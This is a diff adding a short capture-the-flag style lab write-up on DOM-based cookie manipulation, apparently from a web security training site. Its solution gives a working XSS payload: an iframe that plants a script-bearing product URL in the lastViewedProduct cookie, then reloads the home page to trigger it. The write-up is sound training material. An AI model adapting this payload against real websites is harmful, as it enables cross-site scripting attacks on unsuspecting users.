@@ -1,0 +1,13 @@
+// Lab: DOM-based cookie manipulation
+
+This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages. 
+
+
+
+// Solution
+
+1. Notice that the home page uses a client-side cookie called lastViewedProduct, whose value is the URL of the last product page that the user visited.
+
+2. Inject the following exploit in the exploit server:
+
+<iframe src="https://0a5e009d03cbb30c8007e9c000d60020.web-security-academy.net/product?productId=7&'><script>print()</script>" onload="if(!window.x)this.src='https://0a5e009d03cbb30c8007e9c000d60020.web-security-academy.net';window.x=1;"></iframe>
